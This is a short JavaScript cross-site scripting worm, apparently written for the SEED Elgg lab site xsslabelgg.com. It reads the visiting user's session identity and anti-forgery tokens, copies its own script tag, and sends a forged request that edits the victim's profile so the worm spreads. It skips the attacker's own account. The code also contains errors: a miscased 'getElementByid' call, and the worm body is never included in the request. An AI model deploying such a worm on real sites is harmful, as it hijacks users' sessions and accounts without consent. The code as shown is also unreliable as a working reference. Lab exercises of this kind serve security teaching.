<script type="text/javascript" id="worm">
window.onload = function(){

var userName=elgg.session.user.name;
var guid="&guid="+elgg.session.user.guid;

var ts="&__elgg_ts="+elgg.security.token.__elgg_ts;
var token="&__elgg_token="+elgg.security.token.__elgg_token;

var headerTag = "<script type='text/javascript' id='worm'>";
var jsCode = document.getElementByid("worm").innerHTML;
var tailTag = "</" + "script>";

var wormCode = encodeURIComponent(headerTag + jsCode + tailTag);

var desc="&description=" + wormCode +"&accesslevel%5Bdescription%5D=2";
var name = "&name=" +userName;

var sendurl = "http://www.xsslabelgg.com/action/profile/edit"; 
var content=token+ts+name+guid; //FILL IN

var samyGuid=47; //FILL IN
if(elgg.session.user.guid!=samyGuid) 
{

var Ajax=null;
Ajax=new XMLHttpRequest();
Ajax.open("POST",sendurl,true);
Ajax.setRequestHeader("Host","www.xsslabelgg.com");
Ajax.setRequestHeader("Content-Type",
"application/x-www-form-urlencoded");
Ajax.send(content);
}
}
</script>
